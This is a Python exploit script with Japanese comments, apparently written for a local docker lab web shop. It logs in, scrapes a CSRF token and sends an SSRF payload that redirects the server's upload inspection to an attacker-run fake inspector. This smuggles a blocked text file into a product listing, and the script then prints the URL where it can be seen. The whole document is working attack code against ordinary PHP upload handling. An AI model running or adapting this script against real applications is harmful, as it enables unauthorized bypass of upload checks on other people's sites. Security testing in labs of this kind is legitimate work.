

import requests
import re
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# ターゲットや認証情報、SSRF を受ける fake inspector の URL を設定します。
# - TARGET_URL: テスト対象のアプリケーション URL (例: http://localhost:8080)
# - LOGIN_ID / LOGIN_PW: テスト用アカウントの認証情報 (mysql/init.sql に記載のものを想定)
# - FAKE_INSPECTOR_URL: ターゲットが到達可能な fake inspector のアドレス
#   (docker コンテナ内から接続可能である必要があります。host.docker.internal や
#    実マシンの LAN アドレスを指定することが多いです)
TARGET_URL = "" # 任意のサーバーURL

# テスト用ユーザの認証情報
LOGIN_ID = ""  # 任意のユーザーID
LOGIN_PW = ""  # 任意のパスワード

# fake_inspector の URL (ターゲットから接続可能なアドレス)
FAKE_INSPECTOR_URL = "" # flaskサーバーのURL

def main():
    session = requests.Session()
    # ===== ブロック: ログイン =====
    # ここではテスト用ユーザでターゲットにログインします。
    # ログイン成功後にセッション（クッキー）を保持して以降のリクエストで利用します。
    print(f"[*] Logging in as user '{LOGIN_ID}'...")
    login_data = {
        "loginid": LOGIN_ID,
        "password": LOGIN_PW
    }
    try:
        r = session.post(f"{TARGET_URL}/login.php", data=login_data, allow_redirects=False)
        if r.status_code != 302 or "/index.php" not in r.headers.get("Location", ""):
            print("[!] Login failed. Check credentials and target URL.")
            sys.exit(1)
        print("[+] Login successful.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection failed: {e}")
        print("[!] Is the target server running? Is the TARGET_URL correct?")
        sys.exit(1)

    # ===== ブロック: CSRF トークンの取得 =====
    # 商品作成フォームには CSRF トークンが埋め込まれているため、まずページを取得して
    # hidden input からトークンをパースします。取得したトークンは後続のフォーム送信で使用します。
    print("[*] Fetching CSRF token...")
    r = session.get(f"{TARGET_URL}/product.php?mode=make&id=new")
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf_token"})
    if not csrf_token:
        # HTML の綴り間違い等を考慮したフォールバック
        csrf_token = soup.find("input", {"name": "csrf_tokon"})

    if not csrf_token or not csrf_token.get("value"):
        print("[!] Failed to get CSRF token.")
        sys.exit(1)
    csrf_token_value = csrf_token.get("value")
    print(f"[+] CSRF Token found: {csrf_token_value}")

    # ===== ブロック: ステージ1 (SSRF 経由のファイルアップロード) =====
    # この段階ではアップロードフォームにファイルを渡し、検査サーバの URL を SSRF ペイロードとして
    # 指定します。本来検査で弾かれるべきファイル（テキストファイルなど）を一時領域へ配置させることを
    # 目指します。files パラメータは multipart/form-data で送信されます。
    print(f"[*] Starting Stage 1: Uploading 'pwned.txt' via SSRF...")
    print(f"    - Redirecting inspection to: {FAKE_INSPECTOR_URL}")

    # アップロードするファイル（本来ブロックされるはずのテキストファイル）
    files = {
        'img': ('pwned.txt', 'This file should have been blocked by the inspector.', 'text/plain')
    }

    # フォームデータ（確認ページへ遷移させるため form_state=confirm を使う）
    form_data_stage1 = {
        "title": "Pwned Product",
        "text": "This product was created by exploiting an SSRF vulnerability.",
        "price": "1337",
        "type": "0",
        "form_state": "confirm",
        "csrf_tokon": csrf_token_value, # HTML 側での変数名のタイプミスに合わせる
        "url": FAKE_INSPECTOR_URL, # SSRF させる検査サーバの URL
    }

    r = session.post(f"{TARGET_URL}/product.php?mode=make&id=new", data=form_data_stage1, files=files)

    if r.status_code != 200 or "confirm" not in r.text:
        print("[!] Stage 1 failed. The server did not return the confirmation page.")
        sys.exit(1)

    print("[+] Stage 1 successful. File uploaded to temporary location.")

    # ===== ブロック: ステージ2 (確認フォームの commit 処理) =====
    # ステージ1 の確認ページから隠し input を抽出し、form_state=commit で最終送信します。
    # これにより商品登録処理が実行され、一時領域のファイルが商品に紐づけられます。
    print("[*] Starting Stage 2: Committing the product...")
    soup = BeautifulSoup(r.text, "html.parser")

    # 確認フォームから hidden input を収集して再利用する
    commit_form = soup.find("form", {"action": re.compile(r".*mode=make.*")})
    if not commit_form:
        print("[!] Could not find the confirmation form for Stage 2.")
        sys.exit(1)

    form_data_stage2 = {}
    for input_tag in commit_form.find_all("input", {"type": "hidden"}):
        name = input_tag.get("name")
        value = input_tag.get("value")
        if name:
            form_data_stage2[name] = value

    # 最終送信として commit にする
    form_data_stage2['form_state'] = 'commit'

    r = session.post(f"{TARGET_URL}/product.php?mode=make&id=new", data=form_data_stage2)

    if "商品登録が完了しました" not in r.text:
        print("[!] Stage 2 failed. Product registration was not confirmed.")
        sys.exit(1)

    print("\n[+] Exploit successful! Product created with a normally disallowed file type.")

    # ===== ブロック: 作成した商品の検出 =====
    # 作成後はサイトの検索や一覧から 'Pwned Product' を探し、商品ページの id を取得して
    # img.php 経由でアップロードしたファイルにアクセスできるか確認します。
    print("[*] Searching for the URL of the uploaded file...")
    r = session.get(f"{TARGET_URL}/product.php?title=Pwned+Product")
    soup = BeautifulSoup(r.text, "html.parser")

    product_link = soup.find("a", href=re.compile(r'./product.php\?mode=show&id=(\d+)'))
    if product_link:
        product_id = re.search(r'id=(\d+)', product_link['href']).group(1)
        image_url = f"{TARGET_URL}/img.php?id={product_id}"
        print(f"\n[SUCCESS] Verification URL: {image_url}")
        print("    - Visit this URL in your browser. It should display the content of 'pwned.txt'.")
    else:
        print("\n[!] Could not automatically find the new product URL.")
        print("    - Please go to the website and search for 'Pwned Product' to verify.")


if __name__ == "__main__":
    main()

